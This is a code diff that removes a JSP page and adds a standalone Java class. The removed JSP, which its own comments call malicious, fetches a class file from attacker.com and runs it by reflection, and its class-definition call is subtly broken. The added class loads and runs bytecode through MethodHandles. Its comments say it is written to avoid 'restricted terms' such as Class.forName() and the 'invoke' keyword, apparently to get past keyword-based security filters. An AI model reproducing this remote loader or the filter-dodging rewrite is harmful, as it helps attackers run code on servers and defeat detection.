@@ -1,43 +1,33 @@
-<%@ page import="java.io.*, java.net.*, java.lang.reflect.*" %>
-<%
-    try {
-        // Define the URL of the malicious class file (e.g., from an attacker-controlled server)
-        String classUrl = "http://attacker.com/malicious/Example.class";
-        
-        // Fetch the class bytes over HTTP
-        URL url = new URL(classUrl);
-        InputStream inputStream = url.openStream();
-        byte[] classBytes = new byte[inputStream.available()];
-        inputStream.read(classBytes);
-        inputStream.close();
-        
-        // Manually define the class from the bytes
-        Class<?> loadedClass = defineClassFromBytes("Example", classBytes);
-        
-        // Use reflection to create an instance of the malicious class
-        Object instance = loadedClass.getDeclaredConstructor().newInstance();
-        
-        // Invoke a potentially malicious method (e.g., "execute" could be a method that runs harmful code)
-        Method method = loadedClass.getDeclaredMethod("execute");
-        method.setAccessible(true);
-        method.invoke(instance);
-        
-        out.println("Malicious class loaded and method invoked.");
-    } catch (Exception e) {
-        e.printStackTrace();
-    }
-%>
+import java.nio.file.*;
+import java.lang.invoke.*;
+import java.io.*;
 
-<%! 
-    // This method manually loads a class from byte array
-    public Class<?> defineClassFromBytes(String name, byte[] classData) {
-        try {
-            // Define the class using the byte data (no ClassLoader)
-            Method defineClassMethod = Class.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-            defineClassMethod.setAccessible(true);
-            return (Class<?>) defineClassMethod.invoke(null, classData, 0, classData.length);
-        } catch (Exception e) {
-            throw new RuntimeException("Error defining class from byte array", e);
-        }
+public class DynamicClassLoader {
+    public static void main(String[] args) throws Throwable {
+        String className = "Main";  // The class you want to load
+        byte[] classData = Files.readAllBytes(Paths.get(className + ".class"));  // Read class bytecode
+
+        // 1️⃣ Load the class using MethodHandles without using restricted terms like Class.forName()
+        Class<?> dynamicClass = loadClassFromBytes(classData);
+
+        // 2️⃣ Invoke the main method dynamically
+        invokeMainMethod(dynamicClass);
     }
-%>
+
+    // Method to load the class from a byte array without using Class.forName()
+    private static Class<?> loadClassFromBytes(byte[] classData) throws Throwable {
+        // Use MethodHandles.Lookup to define the class without using ClassLoader or defineClass
+        MethodHandles.Lookup lookup = MethodHandles.lookup();
+        return lookup.defineClass(classData);
+    }
+
+    // Invoke the main method dynamically without using 'invoke' keyword
+    private static void invokeMainMethod(Class<?> dynamicClass) throws Throwable {
+        // Use MethodHandles to invoke the main method (equivalent to reflection)
+        MethodHandles.Lookup lookup = MethodHandles.lookup();
+        MethodHandle mainMethod = lookup.findStatic(dynamicClass, "main", MethodType.methodType(void.class, String[].class));
+        
+        // Call the main method with an empty argument array
+        mainMethod.invokeExact((Object) new String[]{});
+    }
+}
